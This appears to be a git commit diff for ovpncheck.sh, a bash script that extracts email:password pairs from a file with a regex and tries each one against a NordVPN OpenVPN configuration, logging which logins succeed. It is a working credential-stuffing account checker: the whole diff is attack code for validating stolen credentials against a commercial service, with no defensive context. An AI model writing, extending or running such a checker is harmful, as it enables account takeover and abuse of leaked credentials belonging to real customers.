3c7a4743d8fedd7b7f7d41297b033ff81bbaa703
darkness <idarkroot@gmail.com>
2019-11-29 13:16:35 +0200

    Added RegExp, small improvements

--- ovpncheck.sh
+++ ovpncheck.sh
@@ -10,19 +10,20 @@ BRIGHT=$(tput bold)
 NORMAL=$(tput sgr0) 
 
 : > checklog.txt
-readarray CREDS  < credlist.txt
+CREDS=($(grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}[:][A-Za-z0-9]+\b" $1))
 
 for ((i=0; i < ${#CREDS[*]}; i++))
 	do
-	openvpn --config nordvpn.com.udp.ovpn --route-noexec --auth-user-pass <(echo -e "${CREDS[i]//:/\\n}") > /dev/null &
-	sleep 10;
-	if [[ -n $(ip tuntap) ]]
+	openvpn --config nordvpn.com.udp.ovpn --route-noexec --auth-user-pass <(echo -e "${CREDS[i]//:/\\n}") --log ovpn.log --daemon
+	sleep 8;
+	if [[ -z $(grep "AUTH_FAILED" ovpn.log) ]]
                 then
-                printf '%s' "Login ${GREEN}SUCCESS${NORMAL} ${CREDS[i]}"
-                printf '%s' "Login SUCCESS ${CREDS[i]}" >> checklog.txt
-                else
-                printf '%s' "Login ${RED}FAILED${NORMAL} ${CREDS[i]}"
-                printf '%s' "Login FAILED ${CREDS[i]}"  >> checklog.txt
+                printf '%s\n' "Login ${GREEN}SUCCESS${NORMAL} ${CREDS[i]}"
+                printf '%s\n' "Login SUCCESS ${CREDS[i]}" >> checklog.txt
+		else
+                printf '%s\n' "Login ${RED}FAILED${NORMAL} ${CREDS[i]}"
+                printf '%s\n' "Login FAILED ${CREDS[i]}"  >> checklog.txt
+
         fi
 kill 15 $(pgrep openvpn)
 done
